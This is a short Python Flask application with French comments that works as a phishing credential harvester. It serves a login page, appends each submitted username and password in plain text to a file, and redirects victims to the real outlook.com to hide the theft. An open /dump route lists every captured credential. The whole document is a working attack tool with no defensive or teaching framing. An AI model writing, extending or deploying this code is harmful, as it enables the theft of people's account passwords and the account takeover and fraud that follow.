from flask import Flask, request, render_template, redirect
import os

app = Flask(__name__)

os.makedirs('logged', exist_ok=True)

@app.route('/')
def index():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')

    with open('logged/credentials.txt', 'a') as f:
        f.write(f'{username}:{password}\n')

    # Redirige vers un vrai site (comme Outlook ou Google)
    return redirect("https://outlook.com")

@app.route('/dump')
def dump():
    try:
        with open('logged/credentials.txt', 'r') as f:
            return "<pre>" + f.read() + "</pre>"
    except FileNotFoundError:
        return "Aucune donnée enregistrée pour le moment."

if __name__ == '__main__':
    app.run(debug=True)

